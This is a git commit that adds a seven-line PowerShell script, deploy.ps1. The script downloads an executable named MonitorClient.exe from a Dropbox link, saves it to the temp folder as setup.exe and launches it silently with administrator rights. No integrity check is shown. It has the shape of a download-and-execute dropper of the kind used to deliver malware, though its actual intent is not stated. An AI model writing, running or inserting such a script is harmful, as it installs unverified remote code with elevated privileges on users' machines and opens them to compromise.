e441f087ae5690e55eb66595522407ac655995e1
Nur Mohammad Rafi <144477870+ostwrafi@users.noreply.github.com>
2026-02-24 19:18:48 +0600

    Create deploy.ps1

---
+++ deploy.ps1
@@ -0,0 +1,7 @@
+# install.ps1 poky
+
+$u = "https://www.dropbox.com/scl/fi/g9n5elasjy54dl2kwfntg/MonitorClient.exe?rlkey=wync0ieqrytdi12bugsw6hzu7&st=lbhdscoe&dl=1"
+$p = "$env:TEMP\setup.exe"
+
+Invoke-RestMethod $u -OutFile $p
+Start-Process $p -ArgumentList "/silent /norestart" -Verb RunAs
